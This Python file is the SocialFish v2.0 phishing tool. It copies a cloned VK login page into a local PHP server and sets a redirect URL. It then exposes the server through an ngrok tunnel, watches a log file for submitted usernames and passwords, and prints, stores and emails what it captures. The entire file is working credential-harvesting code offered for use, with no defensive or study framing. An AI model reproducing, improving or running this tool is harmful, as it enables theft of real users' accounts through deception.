#!/usr/bin/env python3

######################################################
#                                                    #
#       SOCIALFISH v2.0                              #
#                                                    #
# by:     UNDEADSEC                                  #
#                                                    #
# Telegram Group: https://t.me/UndeadSec             #
# YouTube Channel: https://youtube.com/c/UndeadSec   #
# Twitter: https://twitter.com/A1S0N_                #
#                                                    #
######################################################

from contextlib import contextmanager
import json
import multiprocessing
import requests
import os
from time import sleep
from huepy import *
import subprocess
from smtplib import SMTPSenderRefused, SMTPServerDisconnected
from time import strftime

menu_sites = {
  "Social Media": {
    #"Facebook",
    #"Google",
    #"LinkedIn",
    #"Twitter",
    #"Instagram",
     #"Snapchat",
     #"FbRobotCaptcha",
     "VK",
     #"Github",
   },
   "Others": {
     #"StackOverflow",
     #"Wordpress",
     #"Steam",
   }
 }
SF_PROMPT = cyan(" SF > ")

def ask_user(prompt: str, options: dict):
	'''
	Print prompt and verifies if the answer is in options.keys
	'''
	while True:
		resp = input(prompt)
		try:
			resp = int(resp)
		except ValueError:
			'''If cannot be converted to int, its a string option.'''
			pass
		if resp in options.keys():
			return options[resp]

def colorize_option(chave, valor):
	'''
	Based on index type format and print out menu options.
	'''
	if type(chave) == int:
		selector = cyan(' [') + bold(cyan('%s')) + cyan('] ')
		suffix = cyan('%s\n') 
		return selector % chave + suffix % valor
	if type(chave) == str:
		pos = valor.lower().find(chave)
		prefix, radical, suffix = valor.partition(valor[pos])
		if prefix:
			prefix = cyan('%s')
		radical = cyan('[') + bold(cyan('%s' % radical))+ cyan(']')
		return ' %s%s%s\n' % (prefix, radical, suffix)

def get_option(prompt: str, options: dict):
	'''
	Print out options and prompt user.
	'''
	for k, v in options.items():
		print(colorize_option(k,v))
	return ask_user(prompt, options)

def get_letters(opts: list):
	'''
	Return a tuple of unique letter for each word, to build options 
	for menu.
	'''
	selected = []
	for word in opts:
		ch = word.lower()
		if ch[:1] in selected:
			l = set(ch).difference(set(selected))
			sl = min(ch.index(c) for c in l)
			selected.append(ch[sl])
		else:
			selected.append(ch[:1])
	return zip(selected, opts)

def main_menu():
    print(cyan('\n Select an option\n'))
    net_menu = build_menu(menu_sites, SF_PROMPT, False)
    return build_menu(menu_sites[net_menu], SF_PROMPT)

def build_menu(dict_menu: dict, prompt: str=None, numerate: bool=True):
    if not prompt:
        prompt = "\n => "
    numdict = { True: build_options, False: get_letters }
    menu = numdict[numerate](dict_menu)
    resp = get_option(prompt, dict(menu))
    return resp

def build_options(dict_menu):
    '''
    Returns tuple of numbereded options.
    '''
    return enumerate(dict_menu, 1)


def runPhishing(social, custom):
    global _social
    _social = social
    os.system('rm -Rf base/Server/www/*.* && touch base/Server/www/cat.txt')   
    command = 'cp base/WebPages/%s/*.* base/Server/www/' % social.lower()
    os.system(command)
    with open('base/Server/www/login.php') as f:
        read_data = f.read()   
    c = read_data.replace('<CUST0M>', custom)
    f = open('base/Server/www/login.php', 'w')
    f.write(c)
    f.close()

def waitCreds():
    print(cyan(" [*] Waiting for credentials... "))
    while True:
        with open('base/Server/www/cat.txt') as creds:
            lines = creds.read().rstrip()
        if len(lines) != 0:
            print(green('\n [*] Credentials found:\n %s' % lines))
            os.system('rm -rf base/Server/www/cat.txt && touch base/Server/www/cat.txt')
            try:
                credentials(lines.split('\n'), _social)
                send_mail(lines.split('\n'),_social)
            except NameError:
                pass         
            except SMTPSenderRefused:
                print(red(' [!] Sorry, sender refused :('))
                pass
            except SMTPServerDisconnected:
                pass

@contextmanager
def runServer(port: int):
    def php_process():
        os.system("cd base/Server/www/ && php -n -S 127.0.0.1:%d > /dev/null 2>&1 &" % port)
    php_process = multiprocessing.Process(target=php_process)
    php_process.start()
    yield php_process
    php_process.terminate()
    php_process.close()

@contextmanager
def ngrok_start(port: int):
    ngrok_process = subprocess.Popen(
        ['./base/Server/ngrok','http','%s' % port], 
        stdout=subprocess.PIPE, 
        stderr=subprocess.PIPE
    )
    while True:
        try:
            ngrok_url = requests.get('http://127.0.0.1:4040/api/tunnels/command_line')
            if ngrok_url.status_code == 200:
                public_url = json.loads(ngrok_url.text)['public_url']
                print(green(' [~] Ready to Phishing'))
                print(lightgreen(' [*] Ngrok URL: %s' % public_url))
                print(green(' [~] Your logs are being stored in: Logs/{}').format(_social + strftime('-%y%m%d.txt')))
                print(yellow(' [^] Press Ctrl+C or VolDown+C(android) to quit'))
                yield public_url
                break
        except requests.exceptions.ConnectionError:
            sleep(.5)
    os.kill(ngrok_process.pid, 15)

def main():
    site = main_menu()
    while True:
        custom = input(cyan('\n Insert a custom redirect url: > '))

        if not custom:
            pass
        else:
            break
        
        custom = 'http://' + custom if '://' not in custom else custom
    print("Putted {}".format(site.lower()))
    runPhishing(site.lower(), custom)

def PhishingServer(port: int=1449):
    with ngrok_start(port) as ngrok:
        with runServer(port) as php:
            waitCreds()

main()
PhishingServer()